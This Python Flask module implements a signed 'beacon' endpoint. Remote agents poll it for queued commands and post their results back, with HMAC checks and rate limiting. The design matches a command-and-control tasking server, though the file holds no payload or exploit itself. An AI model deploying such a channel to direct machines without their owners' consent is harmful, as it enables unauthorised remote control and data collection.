"""Signed beacon ingest."""
import hashlib
import hmac
import json
import time

from flask import request

from . import dna as dna_db, queue, ratelimit, registry

MAX_BODY = 2 * 1024 * 1024
SKEW = 300


def _verify(dna: str, body: bytes, ts: str, mac: str) -> bool:
    key = dna_db.key_for(dna)
    if not key or not ts or not mac:
        return False
    try:
        stamp = float(ts)
    except ValueError:
        return False
    if abs(time.time() - stamp) > SKEW:
        return False
    expect = hmac.new(bytes.fromhex(key), f"{ts}.".encode() + body,
                      hashlib.sha256).hexdigest()
    return hmac.compare_digest(expect, mac)


def register(app, ok, fail):
    @app.post("/api/beacon/beacon")
    def beacon():
        raw = request.get_data()[:MAX_BODY]
        dna = request.headers.get("X-Dna", "")
        if not _verify(dna, raw, request.headers.get("X-Ts"), request.headers.get("X-Mac")):
            return fail("bad signature", 401)
        if not ratelimit.allow(f"beacon:{dna}", 30):
            return fail("rate limited", 429)
        dna_db.touch(dna)
        nxt = queue.take(dna)
        return ok({"command": nxt[1] if nxt else "", "cid": nxt[0] if nxt else ""})

    @app.post("/api/beacon/result")
    def beacon_result():
        raw = request.get_data()[:MAX_BODY]
        dna = request.headers.get("X-Dna", "")
        if not _verify(dna, raw, request.headers.get("X-Ts"), request.headers.get("X-Mac")):
            return fail("bad signature", 401)
        try:
            body = json.loads(raw or b"{}")
        except json.JSONDecodeError:
            return fail("bad json")
        queue.complete(body.get("cid", ""), json.dumps(body))
        registry.append(dna, body)
        return ok({"stored": True})
